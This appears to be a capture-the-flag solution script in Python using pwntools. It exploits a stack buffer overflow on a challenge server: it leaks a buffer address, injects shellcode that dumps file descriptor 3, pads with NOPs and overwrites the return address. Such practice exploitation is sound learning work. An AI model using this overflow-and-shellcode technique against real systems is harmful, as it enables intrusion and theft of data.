from pwn import *

context.arch = 'i386'
context.os = 'linux'
context.log_level = 'info'

host = 'spelunk.37b17c399f3c1226.challenge.zone'
port = 1337
io = remote(host, port)

io.recvuntil(b"map at: ")
leak = io.recvline().strip()
buf_addr = int(leak, 16)
log.success(f"Adresse de buf : {hex(buf_addr)}")

sc_assembly = shellcraft.read(3, 'esp', 100)
sc_assembly += shellcraft.write(1, 'esp', 100)
shellcode = asm(sc_assembly)

payload = shellcode.ljust(120, b'\x90')

payload += p32(buf_addr) * 10 

log.info("Envoi du payload ajusté...")
io.sendlineafter(b"What did you find? ", payload)

io.recvline() 
io.recvline() 

log.success("Croisons les doigts...")
io.interactive()
                    
